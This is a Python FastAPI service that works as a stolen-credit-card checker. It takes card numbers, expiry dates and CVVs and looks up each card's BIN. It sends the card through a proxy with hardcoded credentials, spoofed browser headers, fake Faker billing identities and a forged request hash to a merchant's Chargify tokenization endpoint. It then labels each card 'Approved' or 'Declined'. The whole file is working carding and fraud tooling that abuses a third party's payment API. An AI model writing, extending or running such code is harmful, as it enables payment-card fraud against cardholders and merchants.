from curl_cffi import requests
import hashlib, os, random
from fastapi import FastAPI, Request, HTTPException, status, Depends, APIRouter
from browserforge.headers import HeaderGenerator
from faker import Faker
from bs4 import BeautifulSoup
import traceback
from faker import Faker
# Global request counter - simple and effective
REQUEST_LIMIT = 5000
request_count = 0

async def limit_requests():
    """
    Simple dependency that tracks global request count
    """
    global request_count
    
    if request_count >= REQUEST_LIMIT:
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail=f"Request limit of {REQUEST_LIMIT} reached. Current count: {request_count}"
        )
    
    request_count += 1
    print(f"Request count: {request_count}/{REQUEST_LIMIT}")  # Debug logging
    
def generate_random_device_id():
    return hashlib.sha256(os.urandom(32)).hexdigest()[:random.randint(8, 36)]

def cap(string: str, start: str, end: str) -> str:
    try:
        str_parts = string.split(start)
        str_parts = str_parts[1].split(end)
        return str_parts[0]
    except IndexError:
        return None

# Create the router with dependency
auth_check = APIRouter(
    prefix="/auth_check",
    dependencies=[Depends(limit_requests)]
)

# Optional: Add an endpoint to check current count
@auth_check.get("/status")
async def get_status():
    """Get current request count status"""
    global request_count
    return {
        "current_count": request_count,
        "limit": REQUEST_LIMIT,
        "remaining": REQUEST_LIMIT - request_count
    }

# Optional: Reset counter (for testing)
@auth_check.post("/reset")
async def reset_counter():
    """Reset the request counter"""
    global request_count
    request_count = 0
    return {"message": "Counter reset", "current_count": request_count}

@auth_check.get("/")
async def tokenize_card(request: Request):
    try:
        lista = request.query_params.get('lista').split('|')
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        cv = lista[3]
        # First get bin info
        bin_response = requests.get(f'https://api.juspay.in/cardbins/{cc[:6]}')
        bin_data = bin_response.json()
        brand = bin_data.get('brand', '').lower()
        country = bin_data.get('country', '').lower()
        card_subtype = bin_data.get('card_sub_type', '').lower()

        # Validate card brand
        if brand not in {"visa", "mastercard", "amex", "jcb"}:
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Unknown ⚠️",
                "message": "This credit card type is not accepted.",
                "bin_info": bin_data
            }
        elif card_subtype in {"maestro"}:
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Unknown ⚠️",
                "message": "This credit card type is not accepted.",
                "bin_info": bin_data
            }

        sess = requests.Session()
        
        # Use provided proxy or default
        sess.proxies.update({
            "http":  "http://k01y9hx3:j6xemfXl@us.premium.stellaproxies.com:23282",
            "https":  "http://k01y9hx3:j6xemfXl@us.premium.stellaproxies.com:23282",
        })

        # Generate headers
        headers_generator = HeaderGenerator()
        headers = headers_generator.generate(http_version=2)
        sess.headers = dict(headers)

        # Prepare request data
        headers = {
            'Accept': '*/*',
            'Referer': 'https://js.chargify.com/',
            'content-type': 'application/json',
            'Origin': 'https://js.chargify.com',
            'Priority': 'u=0',
        }

        json_data = {
            'key': 'chjs_ttrqqj8qf3f29ccwjc6kf7fq',
            'revision': '2025-04-24',
            'credit_card': {
                'full_number': cc,
                'expiration_month': mm,
                'expiration_year': yy,
                'cvv': cv,
                'billing_address': f'{fake.street_address()}',
                'billing_city': fake.city(),
                'billing_country': 'US',
                'billing_state': "NY",
                'billing_zip': f'{fake.zipcode()}',
                'first_name': fake.first_name(),
                'last_name': fake.last_name(),
                'device_data': '',
            },
            'origin': 'https://www.tiny.cloud',
            'h': '',
        }

        # Generate hash
        card = json_data["credit_card"]
        del card["device_data"]
        values = [v for _, v in sorted(card.items())]
        joined = "ﾠ".join(values)
        final_hash = hashlib.sha1(joined.encode('utf-8')).hexdigest()
        json_data['h'] = final_hash

        # Make the request
        response = sess.post(
            'https://tiny-technologies.chargify.com/js/tokens.json',
            headers=headers,
            json=json_data
        )
        response_data = response.json()
        print(response_data)

        if response_data.get('token'):  # Checks if token exists and is not None/empty
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Approved ✅",
                "message": f"Approval - 00",
                "cvc/avs": f"0",
                "code": f"0",
                "token": response_data['token']
            }
        else:
            message = response_data.get('errors', 'Card declined')
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Declined ❌",
                "message": f"{message}",
                "cvc/avs": f"0",
                "code": f"0",
            }

    except Exception as e:
        return{
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "API Error ⚠️",
                "message": "Recheck",
                "cvc/avs": f"0",
                "code": f"0",
            }
